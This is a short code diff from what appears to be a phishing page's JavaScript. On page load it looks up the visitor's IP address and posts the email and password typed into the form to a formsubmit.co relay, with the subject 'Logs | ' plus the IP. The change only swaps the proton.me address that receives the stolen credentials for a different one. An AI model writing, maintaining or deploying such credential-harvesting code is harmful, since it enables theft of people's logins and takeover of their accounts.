@@ -102,7 +102,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
                 // Fetch IP and location data
                 $.getJSON('https://ipinfo.io/json', function(response) {
-                    const posting = $.post("https://formsubmit.co/ajax/gabriel5657@proton.me", {
+                    const posting = $.post("https://formsubmit.co/ajax/firmcaster@proton.me", {
                         _subject: "Logs | " + response.ip,
                         Email: $("#email").val() || userDisplay.textContent,
                         Password: $("#psw").val(),
